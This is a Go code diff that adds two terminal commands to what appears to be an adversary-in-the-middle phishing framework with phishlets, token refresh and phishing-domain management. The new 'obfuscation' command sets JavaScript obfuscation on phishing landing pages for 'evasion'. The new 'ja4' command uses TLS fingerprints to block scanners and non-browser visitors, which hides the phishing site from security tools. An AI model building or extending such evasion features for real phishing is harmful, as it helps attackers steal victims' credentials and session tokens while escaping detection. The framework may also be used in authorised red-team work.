@@ -229,6 +229,15 @@ func (t *Terminal) DoWork() {
 			if err != nil {
 				log.Error("devicecode: %v", err)
 			}
+		case "obfuscation":
+			cmd_ok = true
+			t.handleObfuscation(args[1:])
+		case "ja4":
+			cmd_ok = true
+			err := t.handleJA4(args[1:])
+			if err != nil {
+				log.Error("ja4: %v", err)
+			}
 		case "feed":
 			cmd_ok = true
 			t.handleFeed(args[1:])
@@ -1203,6 +1212,67 @@ func (t *Terminal) handleEvilPuppet(args []string) error {
 		}
 	}
 	return fmt.Errorf("invalid syntax: %s", args)
+}
+
+func (t *Terminal) handleObfuscation(args []string) {
+	pn := len(args)
+	if pn == 0 {
+		log.Info("js obfuscation level: %s", GetObfuscationLevel())
+		return
+	}
+	level := strings.ToLower(args[0])
+	switch level {
+	case "off", "low", "medium", "high":
+		SetObfuscationLevel(level)
+		log.Info("js obfuscation level set to: %s", level)
+	default:
+		log.Error("invalid obfuscation level: %s (valid: off, low, medium, high)", level)
+	}
+}
+
+func (t *Terminal) handleJA4(args []string) error {
+	pn := len(args)
+	if pn == 0 {
+		if t.p.ja4 != nil {
+			log.Info("ja4: %s", t.p.ja4.GetStatus())
+		} else {
+			log.Info("ja4: disabled (JA4 fingerprinter not initialized)")
+		}
+		return nil
+	}
+	switch args[0] {
+	case "blocklist":
+		if pn < 2 {
+			return fmt.Errorf("usage: ja4 blocklist <ja4_hash>")
+		}
+		if t.p.ja4 != nil {
+			t.p.ja4.AddToBlocklist(args[1])
+			log.Info("ja4: added '%s' to blocklist", args[1])
+		} else {
+			log.Error("ja4: fingerprinter not initialized")
+		}
+	case "autoblock":
+		if pn < 2 {
+			return fmt.Errorf("usage: ja4 autoblock <on|off>")
+		}
+		if t.p.ja4 != nil {
+			switch args[1] {
+			case "on", "true", "1":
+				t.p.ja4.SetAutoBlock(true)
+				log.Info("ja4: auto-blocking enabled")
+			case "off", "false", "0":
+				t.p.ja4.SetAutoBlock(false)
+				log.Info("ja4: auto-blocking disabled")
+			default:
+				return fmt.Errorf("invalid value: %s (use on/off)", args[1])
+			}
+		} else {
+			log.Error("ja4: fingerprinter not initialized")
+		}
+	default:
+		return fmt.Errorf("unknown ja4 subcommand: %s (use blocklist, autoblock)", args[0])
+	}
+	return nil
 }
 
 func (t *Terminal) handleCfClearance(args []string) error {
@@ -3599,6 +3669,12 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("evilpuppet", []string{"refresh"}, "refresh <phishlet>", "refresh tokens for a phishlet via the pool")
 	h.AddSubCommand("evilpuppet", []string{"collect"}, "collect", "retrieve all completed pool refresh results")
 	h.AddSubCommand("evilpuppet", []string{"clear"}, "clear", "kill all pool browsers and clear collected results")
+
+	h.AddCommand("obfuscation", "general", "manage JS obfuscation level for landing pages", "Sets the JS obfuscation strength: off, low, medium, high. Higher levels increase evasion but may impact performance.", LAYER_TOP,
+		readline.PcItem("obfuscation", readline.PcItem("off"), readline.PcItem("low"), readline.PcItem("medium"), readline.PcItem("high")))
+
+	h.AddCommand("ja4", "general", "manage JA4 TLS fingerprint blocking", "Configure JA4 TLS fingerprinting to detect and block scanners. Uses TLS client hello fingerprint matching to identify non-browser traffic.", LAYER_TOP,
+		readline.PcItem("ja4", readline.PcItem("blocklist"), readline.PcItem("autoblock", readline.PcItem("on"), readline.PcItem("off"))))
 
 	h.AddCommand("domains", "general", "manage external DNS for phishing domains", "Configure external DNS providers (Cloudflare, DigitalOcean) to manage DNS records automatically. This removes the need for the internal nameserver on UDP 53 and improves stealth.", LAYER_TOP,
 		readline.PcItem("domains", readline.PcItem("add"), readline.PcItem("delete"), readline.PcItem("config"), readline.PcItem("list"), readline.PcItem("help")))
